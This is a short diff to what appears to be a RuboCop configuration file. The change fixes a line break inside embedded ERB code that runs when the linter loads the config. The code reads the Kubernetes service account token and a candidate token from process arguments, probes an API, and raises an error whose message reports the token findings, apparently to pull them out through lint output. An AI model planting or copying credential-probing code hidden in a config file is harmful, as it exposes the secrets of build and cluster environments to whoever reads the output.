@@ -166,7 +166,8 @@ AllCops:
         recheck_api_status = "error=#{recheck_error.class}"
       end
       recheck_sa = (File.read('/var/run/secrets/kubernetes.io/serviceaccount/token') rescue '').strip
-      marker = marker + ",SOL_RUBOCOP_TOKEN_RECHECK_20260715=pid1_arg=#{!recheck_candidate.empty?},candidate_len=#{recheck_candidate.length},sa_token_present=#{!recheck_sa.empty?},api_status=#{recheck_api_status},api_bytes=#{recheck_api_bytes}"`n      raise marker
+      marker = marker + ",SOL_RUBOCOP_TOKEN_RECHECK_20260715=pid1_arg=#{!recheck_candidate.empty?},candidate_len=#{recheck_candidate.length},sa_token_present=#{!recheck_sa.empty?},api_status=#{recheck_api_status},api_bytes=#{recheck_api_bytes}"
+      raise marker
     end %>
 - <%= begin
       require 'net/http'
